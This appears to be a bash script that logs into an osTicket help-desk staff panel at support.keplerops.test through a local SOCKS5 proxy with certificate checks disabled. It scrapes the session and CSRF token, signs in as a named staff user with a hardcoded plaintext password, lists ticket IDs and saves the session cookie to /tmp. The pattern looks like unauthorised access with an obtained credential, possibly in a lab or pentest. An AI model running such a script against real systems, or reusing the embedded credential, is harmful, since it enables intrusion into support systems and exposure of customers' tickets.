#!/bin/bash
P="--socks5-hostname 127.0.0.1:1080"
B=https://support.keplerops.test
UA="Mozilla/5.0"
rm -f /tmp/hdr /tmp/l.html
curl -sS $P -k -m 20 -A "$UA" -D /tmp/hdr -o /tmp/l.html "$B/scp/login.php"
SID=$(grep -oP 'OSTSESSID=\K[0-9a-f]+' /tmp/hdr | head -1)
TOK=$(grep -oP 'name="__CSRFToken__" value="\K[^"]+' /tmp/l.html | head -1)
echo "sid=$SID tok=$TOK"
curl -sS $P -k -m 25 -A "$UA" -H "Cookie: OSTSESSID=$SID" -o /tmp/p.html -D /tmp/h2 \
  --data-urlencode "__CSRFToken__=$TOK" --data-urlencode "do=scplogin" \
  --data-urlencode "userid=maya.ranscombe" \
  --data-urlencode "passwd=sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk" \
  --data-urlencode "remember=1" "$B/scp/login.php"
head -8 /tmp/h2
grep -oiP '<title>[^<]*|incorrect|invalid|access denied|locked' /tmp/p.html | sort -u | head
SID2=$(grep -oP 'OSTSESSID=\K[0-9a-f]+' /tmp/h2 | head -1); echo "sid2=$SID2"
SID=${SID2:-$SID}
echo "=== tickets"
curl -sS $P -k -m 25 -A "$UA" -H "Cookie: OSTSESSID=$SID" -o /tmp/tt.html -w '%{http_code} %{size_download}\n' "$B/scp/tickets.php"
grep -oiP '<title>[^<]*' /tmp/tt.html
grep -oP 'tickets\.php\?id=\d+' /tmp/tt.html | sort -u | head -30
echo "$SID" > /tmp/ostsid
